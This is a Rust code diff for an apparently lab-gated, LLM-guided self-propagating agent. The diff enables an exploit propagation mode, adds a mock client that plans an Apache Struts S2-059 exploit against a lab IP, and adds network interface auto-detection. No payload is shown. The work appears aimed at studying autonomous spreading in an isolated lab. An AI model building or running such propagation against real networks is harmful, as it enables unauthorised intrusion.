@@ -50,17 +50,29 @@ impl LlmConfig {
 
         let mut gate = PolicyGate::lab_default();
         gate.allowed_cidrs = allowed_cidrs;
+        gate.exploit_enabled = cli.exploit_enabled;
 
-        let allowed_methods = vec![
+        let mut allowed_methods = vec![
             PropagationMethodClass::Ssh,
             PropagationMethodClass::Http,
             PropagationMethodClass::NoPath,
         ];
+        if cli.exploit_enabled {
+            allowed_methods.push(PropagationMethodClass::Exploit);
+        }
 
         let client: Arc<dyn physarum_llm::LlmClient> = if endpoint == "mock" {
             Arc::new(MockLlmClient::no_path("mock mode — no real LLM"))
         } else if endpoint == "mock-http" {
             Arc::new(MockLlmClient::http_probe_with_plan("/", 0.9))
+        } else if endpoint.starts_with("mock-exploit") {
+            // mock-exploit[:<source_ip>[:<port>]] — Phase 2 dry-run
+            // e.g. mock-exploit:172.21.0.2:8080
+            let mut parts = endpoint.splitn(3, ':');
+            let _ = parts.next(); // "mock-exploit"
+            let src = parts.next().unwrap_or("172.21.0.2");
+            let port: u16 = parts.next().and_then(|p| p.parse().ok()).unwrap_or(8080);
+            Arc::new(MockLlmClient::exploit_struts_s2_059(src, port, 0.92))
         } else {
             let api_key = cli.llm_api_key.clone().unwrap_or_default();
             match OpenAiCompatibleClient::new(
@@ -98,7 +110,16 @@ fn parse_cidr(cidr: Option<&str>) -> Option<Vec<(std::net::Ipv4Addr, u8)>> {
     Some(vec![(ip, prefix)])
 }
 
-pub async fn run(cli: Cli) -> Result<()> {
+pub async fn run(mut cli: Cli) -> Result<()> {
+    // Resolve interface name before anything uses it.
+    // "auto" → find the interface whose IP is in --llm-allowed-cidr with the
+    // highest prefix length (most specific = most likely the internal/lab NIC).
+    cli.interface = resolve_interface(&cli.interface, cli.llm_allowed_cidr.as_deref())
+        .unwrap_or_else(|e| {
+            tracing::warn!(err = %e, "interface auto-detection failed — falling back to eth0");
+            "eth0".to_string()
+        });
+
     let llm = LlmConfig::from_cli(&cli);
     let intel = VulnerabilityIntelService::from_env().unwrap_or_else(|e| {
         tracing::warn!(err = %e, "VulnerabilityIntelService init failed — offline cache empty");
@@ -153,7 +174,7 @@ pub async fn run(cli: Cli) -> Result<()> {
                     Some(ip) => {
                         dormant_at = tokio::time::Instant::now() + stimulus_timeout;
                         handle_candidate(
-                            ip, "icmp", &mut lineage, &binary_path, &mut attempted, &llm, &intel,
+                            ip, "icmp", &mut lineage, &binary_path, &mut attempted, &llm, &intel, local_ip,
                         ).await?;
                     }
                     None => {
@@ -169,7 +190,7 @@ pub async fn run(cli: Cli) -> Result<()> {
                     Some(ip) => {
                         dormant_at = tokio::time::Instant::now() + stimulus_timeout;
                         handle_candidate(
-                            ip, "tcp-syn", &mut lineage, &binary_path, &mut attempted, &llm, &intel,
+                            ip, "tcp-syn", &mut lineage, &binary_path, &mut attempted, &llm, &intel, local_ip,
                         ).await?;
                     }
                     None => {
@@ -194,7 +215,7 @@ pub async fn run(cli: Cli) -> Result<()> {
                     for ip in candidates {
                         handle_candidate(
                             ip, "startup-sensing", &mut lineage, &binary_path,
-                            &mut attempted, &llm, &intel,
+                            &mut attempted, &llm, &intel, local_ip,
                         ).await?;
                     }
                 }
@@ -212,7 +233,7 @@ pub async fn run(cli: Cli) -> Result<()> {
                     Some(ip) => {
                         dormant_at = tokio::time::Instant::now() + stimulus_timeout;
                         handle_candidate(
-                            ip, "ebpf", &mut lineage, &binary_path, &mut attempted, &llm, &intel,
+                            ip, "ebpf", &mut lineage, &binary_path, &mut attempted, &llm, &intel, local_ip,
                         ).await?;
                     }
                     None => {
@@ -263,6 +284,7 @@ async fn handle_candidate(
     attempted: &mut HashSet<Ipv4Addr>,
     llm: &Option<LlmConfig>,
     intel: &VulnerabilityIntelService,
+    local_ip: Option<Ipv4Addr>,
 ) -> Result<()> {
     let ip_str = src_ip.to_string();
 
@@ -305,6 +327,7 @@ async fn handle_candidate(
             cfg.client.as_ref(),
             &cfg.gate,
             intel,
+            local_ip,
         )
         .await?
         {
@@ -452,4 +475,92 @@ fn local_ip(interface: &str) -> anyhow::Result<Ipv4Addr> {
         }
     }
     anyhow::bail!("no IPv4 address found for interface '{}'", interface)
+}
+
+/// Resolve the actual interface name from a potentially abstract value.
+///
+/// When `interface` is `"auto"`:
+///   - If `allowed_cidr` is provided: collect all non-loopback IPv4 interfaces
+///     whose IP falls within the CIDR, then pick the one with the highest prefix
+///     length (most specific subnet = most likely the isolated lab / VPC NIC).
+///   - If no CIDR or no match: pick the first non-loopback IPv4 interface.
+///
+/// When `interface` is any other value: return it unchanged.
+fn resolve_interface(interface: &str, allowed_cidr: Option<&str>) -> anyhow::Result<String> {
+    if interface != "auto" {
+        return Ok(interface.to_string());
+    }
+
+    let all = if_addrs::get_if_addrs()?;
+
+    // Collect non-loopback IPv4 candidates, optionally filtered by CIDR,
+    // tagged with prefix length for sorting.
+    let mut candidates: Vec<(String, u8)> = all
+        .iter()
+        .filter(|i| !i.is_loopback())
+        .filter_map(|i| {
+            if let if_addrs::IfAddr::V4(v4) = &i.addr {
+                if let Some(cidr) = allowed_cidr {
+                    if !ip_in_cidr(v4.ip, cidr) {
+                        return None;
+                    }
+                }
+                Some((i.name.clone(), netmask_prefix(v4.netmask)))
+            } else {
+                None
+            }
+        })
+        .collect();
+
+    // Higher prefix length = more specific subnet = preferred (internal NIC).
+    candidates.sort_by(|a, b| b.1.cmp(&a.1));
+
+    if let Some((name, prefix)) = candidates.into_iter().next() {
+        tracing::info!(
+            iface = %name,
+            prefix = %prefix,
+            cidr = ?allowed_cidr,
+            "auto: selected interface (highest prefix in CIDR)"
+        );
+        return Ok(name);
+    }
+
+    // Fallback: no CIDR match — pick any non-loopback IPv4 interface.
+    for iface in &all {
+        if !iface.is_loopback() {
+            if let if_addrs::IfAddr::V4(_) = &iface.addr {
+                tracing::warn!(
+                    iface = %iface.name,
+                    "auto: no interface in CIDR — falling back to first non-loopback"
+                );
+                return Ok(iface.name.clone());
+            }
+        }
+    }
+
+    anyhow::bail!("auto: no usable IPv4 interface found")
+}
+
+/// Returns true when `ip` falls within the CIDR given as `"x.x.x.x/prefix"`.
+fn ip_in_cidr(ip: std::net::Ipv4Addr, cidr: &str) -> bool {
+    let Some((net_str, prefix_str)) = cidr.split_once('/') else {
+        return false;
+    };
+    let Ok(net) = net_str.parse::<std::net::Ipv4Addr>() else {
+        return false;
+    };
+    let Ok(prefix) = prefix_str.parse::<u8>() else {
+        return false;
+    };
+    if prefix == 0 {
+        return true;
+    }
+    let mask = !0u32 << (32 - prefix);
+    (u32::from(ip) & mask) == (u32::from(net) & mask)
+}
+
+/// Convert a netmask address to a CIDR prefix length.
+/// e.g. 255.255.255.0 → 24, 255.255.0.0 → 16.
+fn netmask_prefix(netmask: std::net::Ipv4Addr) -> u8 {
+    u32::from(netmask).leading_ones() as u8
 }
